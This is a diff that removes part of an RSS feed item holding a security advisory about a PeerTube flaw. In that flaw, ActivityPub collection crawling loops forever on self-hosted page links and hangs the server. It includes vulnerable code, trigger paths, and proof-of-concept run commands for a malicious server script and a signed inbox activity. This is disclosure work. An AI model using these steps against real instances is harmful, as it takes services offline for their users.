-    if (typeof nextLink === 'string') {
-      // Don't crawl ourselves
-      const remoteHost = new URL(nextLink).host
-      if (remoteHost === WEBSERVER.HOST) continue
-
-      url = nextLink
-
-      const res = await fetchAP<ActivityPubOrderedCollection<T>>(url)
-      body = res.body
-    } else {
-      // nextLink is already the object we want
-      body = nextLink
-    }
-
-    nextLink = body.next
-    i++
-    ...
-  }
-```
-
-This code is meant to iterate through the pages, up to a maximum amount of **ACTIVITY_PUB.FETCH_PAGE_LIMIT** (2000) pages. When reaching a URL that has the same host as the server, the loop continues without incrementing the variable **i** or changing the **nextLink** variable. This means that the loop will never end. In our tests the server was busy running the endless loop and failed to respond to any other requests.
-
-It is also possible to trigger the attack by causing the server to actively fetch activities from a remote server. This can be done in different ways, for example by using the **/api/v1/search/video-channels** path, and passing the **search** argument with a URL that can be used for the attack. This can be done only if users have the ability to search remote URIs (**search.remote_uri** in the configuration), which by default is enabled for registered users.
-
-
-
-## PoC
-
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there is a channel called **root_channel**, belonging to the root user. For simplifying the PoC, we set the **prevent_ssrf** configuration to **false**, allowing us to create an attacking server easily on the same machine. Note that running this PoC will cause PeerTube’s server to stop responding, and it will need to be killed.
-
-
-
-1. In a terminal, run the following command (you will need to install the **flask** package for python if it is not installed on the system):
-
-   ```
-   python malicious_rest_server.py
-   ```
-
-   This will start a server listening on port 1234.
-
-1. In another terminal, run the following command (you will need to install the **cryptography** and **requests** packages for python if they are not installed on the system):
-
-   ```
-   python send_inbox_activity.py --stuck
-   ```
-
-   This script will create, sign and send a Create Activity to **http://localhost:9000/inbox**.
-
-1. If everything was configured correctly, the PeerTube server won’t function normally anymore.
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
-
-[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
-]]></content:encoded>
         </item>
     </channel>
 </rss>
